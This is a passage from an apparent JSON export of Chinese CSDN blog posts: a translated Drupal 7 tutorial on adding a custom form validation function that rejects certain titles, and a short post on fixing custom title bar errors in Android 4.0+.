0.909em;\"><span class=\"mi\" id=\"MathJax-Span-1065\" style=\"font-size: 70.7%; font-family: MathJax_Math-italic;\">s</span><span style=\"display: inline-block; width: 0px; height: 2.456em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-1066\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-1067\" style=\"font-family: MathJax_Math-italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-1068\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-1069\" style=\"font-family: MathJax_Math-italic;\">e</span><span class=\"msup\" id=\"MathJax-Span-1070\"><span style=\"display: inline-block; position: relative; width: 0.589em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.816em 1000.003em 3.149em -0.371em); top: -2.717em; left: 0.003em;\"><span class=\"mo\" id=\"MathJax-Span-1071\" style=\"font-family: MathJax_Main;\">[</span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span><span style=\"position: absolute; top: -2.984em; left: 0.323em;\"><span class=\"mo\" id=\"MathJax-Span-1072\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-1073\" style=\"font-family: MathJax_Math-italic;\">v</span><span class=\"mi\" id=\"MathJax-Span-1074\" style=\"font-family: MathJax_Math-italic;\">a</span><span class=\"mi\" id=\"MathJax-Span-1075\" style=\"font-family: MathJax_Math-italic;\">l</span><span class=\"mi\" id=\"MathJax-Span-1076\" style=\"font-family: MathJax_Math-italic;\">u</span><span class=\"mi\" id=\"MathJax-Span-1077\" style=\"font-family: MathJax_Math-italic;\">e</span><span class=\"msup\" id=\"MathJax-Span-1078\"><span style=\"display: inline-block; position: relative; width: 0.749em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.424em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-1079\" style=\"font-family: MathJax_Math-italic;\">s</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.877em; left: 0.483em;\"><span class=\"mo\" id=\"MathJax-Span-1080\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-1081\" style=\"font-family: MathJax_Main;\">]</span><span class=\"msup\" id=\"MathJax-Span-1082\"><span style=\"display: inline-block; position: relative; width: 0.589em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.816em 1000.003em 3.149em -0.371em); top: -2.717em; left: 0.003em;\"><span class=\"mo\" id=\"MathJax-Span-1083\" style=\"font-family: MathJax_Main;\">[</span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span><span style=\"position: absolute; top: -2.984em; left: 0.323em;\"><span class=\"mo\" id=\"MathJax-Span-1084\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mi\" id=\"MathJax-Span-1085\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-1086\" style=\"font-family: MathJax_Math-italic;\">i</span><span class=\"mi\" id=\"MathJax-Span-1087\" style=\"font-family: MathJax_Math-italic;\">t</span><span class=\"mi\" id=\"MathJax-Span-1088\" style=\"font-family: MathJax_Math-italic;\">l</span><span class=\"msup\" id=\"MathJax-Span-1089\"><span style=\"display: inline-block; position: relative; width: 0.749em; height: 0px;\"><span style=\"position: absolute; clip: rect(1.976em 1000.003em 2.723em -0.424em); top: -2.557em; left: 0.003em;\"><span class=\"mi\" id=\"MathJax-Span-1090\" style=\"font-family: MathJax_Math-italic;\">e</span><span style=\"display: inline-block; width: 0px; height: 2.563em;\"></span></span><span style=\"position: absolute; top: -2.877em; left: 0.483em;\"><span class=\"mo\" id=\"MathJax-Span-1091\" style=\"font-size: 70.7%; font-family: MathJax_Main;\">′</span><span style=\"display: inline-block; width: 0px; height: 2.509em;\"></span></span></span></span><span class=\"mo\" id=\"MathJax-Span-1092\" style=\"font-family: MathJax_Main;\">]</span><span class=\"mo\" id=\"MathJax-Span-1093\" style=\"font-family: MathJax_Main;\">,</span></span><span style=\"display: inline-block; width: 0px; height: 2.723em;\"></span></span></span><span style=\"border-left-width: 0.003em; border-left-style: solid; display: inline-block; overflow: hidden; width: 0px; height: 1.537em; vertical-align: -0.397em;\"></span></span></nobr></span><script type=\"math/tex\" id=\"MathJax-Element-102\">form_state['values']['title'], </script>invalid_titles)) { .. } <br>\n“` <br>\n接下来我们判断标题值是否等于数组里面任何一个成员</p>\n\n<p>OK，教程到此结束，相信你应该也会使用验证函数了吧， <br>\n没错，这就是一个简单的验证函数。</p>",
			"markdowncontent":"注：原文链接：http://befused.com/drupal/form-validation（翻译水平有限，还望海涵）\nstart：\n表单验证是web系统中必不可少的一部分，你需要确保用户输入的信息是否是可取的，如果不可取会反馈错误信息\n感谢Drupal钩子，你可以简单的在任何一个表单中增加验证，即使你并没有创建这个表单。在这个教程里面，你会学习怎样用验证函数去验证一篇文章表单，增加一篇文章的的地址在这里 node/add/article\n 示例你要确保用户不能增加这个标题打的文章：” the quick fox jumped over the lazy dog”,如果写下了这个标题，则返回一个错误信息。\n在这个教程中，你可能需要下载和开启一个叫devel的开发神器来打印消息(dpm函数)。\n\n**Alter the form**\n------------------\n\n增加一个新的验证函数，你需要去alter下这个表单（至于为什么我不细讲了，就是重写下表单）如果看不懂看完这里应该就会了（\n○17天开始模块开发（http://befused.com/drupal/form-alter）\n○23天开始模块开发。（http://befused.com/drupal/first-module）\n）\nOK，我们开始吧 \n\n```\n1.\tfunction starting_drupal_dev_form_alter(&$form, &$form_state, $form_id) {\n2.\t  if ($form_id == 'article_node_form') {\n3.\t    dpm($form['#validate']);\n4.\t  }\n5.\t} \n\n```从上面代码可以看到，我们第一步判断form的ID是否是acticle_node_form，然后用dpm($form[‘#validate’]),。它列出了所有的验证函数。\n当你点击进/node/add/acticle页面，你可以看见node_form_validate(),\n![这里写图片描述](http://img.blog.csdn.net/20150406223536156)\n\n增加一个验证处理的handler(这个词一下子不知道怎么翻译了)\n--------------------------------\n你需要增加一个验证函数到$form[‘#validate’]这个数组里面\n函数名：’ starting_drupal_dev_form_validate’\n\n```\n1.\tfunction starting_drupal_dev_form_alter(&$form, &$form_state, $form_id) {\n2.\t  if ($form_id == 'article_node_form') {\n3.\t    $form['#validate'][] = 'starting_drupal_dev_form_validate';\n4.\t    dpm($form['#validate']);\n5.\t  }\n6.\t} \n\n```你现在可以在打印机上看见这里有两个验证handlers.核心的 node_form_validate是其中的一个![这里写图片描述](http://img.blog.csdn.net/20150406223756947)\n创建一个验证函数：\n现在你需要增加一个回调函数starting_drupal_dev_form_validate()\n\n```\n1.\tfunction starting_drupal_dev_form_validate($form, &$form_state) {\n2.\t \n3.\t} \n``当表单被提交后，这个表单的值存放在$form_state里面，你可以打印出来看一看`\n\n```\n1.\tfunction starting_drupal_dev_form_validate($form, &$form_state) {\n2.\t  dpm($form_state);\n3.\t}\n\n![这里写图片描](http://img.blog.csdn.net/20150406223933807)\n找到你需要的字段。$form_state[‘values’][’title’]\n如果这个值为“the quick fox jumped over the lazy dog”就返回一个错误\n![这里写图片描述](http://img.blog.csdn.net/20150406223959660)\n\n```\n1.\tfunction starting_drupal_dev_form_validate($form, &$form_state) {\n2.\t  if ($form_state['values']['title'] == 'the quick fox jumped over the lazy dog') {\n3.\t    form_set_error('title', t('You have added an invalid title.'));\n4.\t  }\n5.\t}\n\n**```我们先分析下上面的函数**\n\n```\nif ($form_state['values']['title'] == 'the quick fox jumped over the lazy dog)\n这里是一个简单的判断函数\n如果它的值是the quick fox jumped over the lazy dog它将返回真\n然后里面的代码将会被执行\n\n```\nform_set_error('title', t('You are not allowed to use \"the quick fox jumped over the lazy dog\" as a title.')```\n\n![这里写图片描述](http://img.blog.csdn.net/20150406224134945)\n\n验证多种标题\n------\n现在我们来试着用两个值进行验证。第二个值就取：“birds of a feather flock together”\n\n```\n1.\tfunction starting_drupal_dev_form_validate($form, &$form_state) {\n2.\t  $invalid_titles = array('the quick fox jumped over the lazy dog', 'birds of a feather flock together');\n3.\t  if (in_array($form_state['values']['title'], $invalid_titles)) {\n4.\t    form_set_error('title', t('You have added an invalid title.'));\n5.\t  }\n6.\t}\n```\n拆分来看看吧\n\n```\n$invalid_titles = array('the quick fox jumped over the lazy dog', 'birds of a feather flock together');\n```\n首先，我们创建了一个需要判断标题的数组\n\n```\nif (in_array($form_state['values']['title'], $invalid_titles)) { .. }\n```\n接下来我们判断标题值是否等于数组里面任何一个成员\n\nOK，教程到此结束，相信你应该也会使用验证函数了吧，\n没错，这就是一个简单的验证函数。\n",
			"tags":"drupal,表单,validation,drupal7,自定义",
			"id":"44907337",
			"categories":"drupal-7",
			"status":1
		},
		"error":"",
		"status":true
	},
	{
		"data":{
			"date":"2014年11月17日 16:55:53",
			"articleedittype":1,
			"private":0,
			"channel":"1",
			"description":"前两天第一次做一个安卓项目，在自定义标题栏就出现了很多问题。\r\n研究这些问题就研究了好ban'tian",
			"title":"关于android自定义标题栏出现的问题总结",
			"type":"original",
			"content":"\r\n<p></p>\r\n<p>前两天第一次做一个安卓项目，在自定义标题栏就出现了很多问题。</p>\r\n<p>研究这些问题就研究了好半天。没办法，作为一个安卓初学者。遇到问题就慢慢解决吧。</p>\r\n<p>OK</p>\r\n<p>下面我就简单讲一讲自定义标题栏步骤：</p>\r\n<p>首先在主类的Oncreate函数里面要添加两句</p>\r\n<p><span style=\"color:#33CC00\">//</span><span style=\"color:#33CC00\">设置启动标题栏为自定义标题栏</span></p>\r\n<p><span style=\"color:#2A2A2A\">requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);</span></p>\r\n<p align=\"left\"><span style=\"color:#3F7F5F\">// </span><span style=\"color:#3F7F5F\">设置</span><u><span style=\"color:#3F7F5F\">titlebar</span></u><span style=\"color:#3F7F5F\">为标题栏</span></p>\r\n<p align=\"left\">getWindow().setFeatureInt(Window.<em><span style=\"color:#0000C0\">FEATURE_CUSTOM_TITLE</span></em>,R.layout.<em><span style=\"color:#0000C0\">titlebar</span></em>);最重要的是位置顺序不能颠倒，很多普通错误都是这个原因引起的</p>\r\n<p>requestWindowFeature(Window.FEATURE_CUSTOM_TITLE);</p>\r\n<p>这一句是需要放在setContentView 的前面</p>\r\n<p>getWindow().setFeatureInt(Window.<em><span style=\"color:#0000C0\">FEATURE_CUSTOM_TITLE</span></em>,R.layout.<em><span style=\"color:#0000C0\">titlebar</span></em>);</p>\r\n<p>然后再Layout目录下面要有标题栏的布局文件，在value目录下面的style文件对标题栏进行样式设置</p>\r\n<p>再添加到AndroidManifest.xml这个文件里面</p>\r\n<p>&nbsp;</p>\r\n<p>网上这样的操作教程很多我就不做累述了。</p>\r\n<p>我遇到的一个<span style=\"color:red\">问题</span>就是安卓android4.0以上版本自定义标题栏出错，就是在主线程的类中继承的问题</p>\r\n<p>MainActivity extends <strong>Activity</strong></p>\r\n<p>这里是需要继承Activity这个父类，如果你开发Android4.0以上版本，他就会自动继承<strong>ActionBarActivity</strong>这个类</p>\r\n<p><span style=\"color:#33cc00\"><br>\r\n</span></p>\r\n",
			"tags":"android自定义标题栏问题,android4.0以上自定义标题问题,安卓4.0以上版本自定义标题栏出错",
			"id":"41212065",
			"categories":"android一些总结",
			"status":1
		},
		"error":"",
		"status":true
	}
]